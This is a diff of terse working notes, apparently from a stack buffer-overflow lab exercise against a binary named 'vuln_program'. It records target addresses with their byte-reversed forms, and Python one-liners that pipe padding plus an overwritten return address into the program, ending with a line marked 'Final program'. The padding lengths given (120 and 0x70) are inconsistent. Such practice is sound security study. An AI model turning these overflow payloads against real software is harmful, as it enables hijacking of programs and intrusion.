@@ -99,9 +99,30 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 00000000 <target>:
 00\40\0a\f7
 \f7\0a\40\00
-python -c 'print "a"*116 + "\xf7\x0a\x40\x00"' | r
+python -c 'print "a"*120 + "\x9f\x10\x40"' | r
+
+0 40 10 9f
 
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
 @
 
 00 40 0a f7
+40 10 9f
+\x9f\x10\x40
+//Final program
+python -c 'print "a"*0x70 + "\x9f\x10\x40"' | ./vuln_program
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
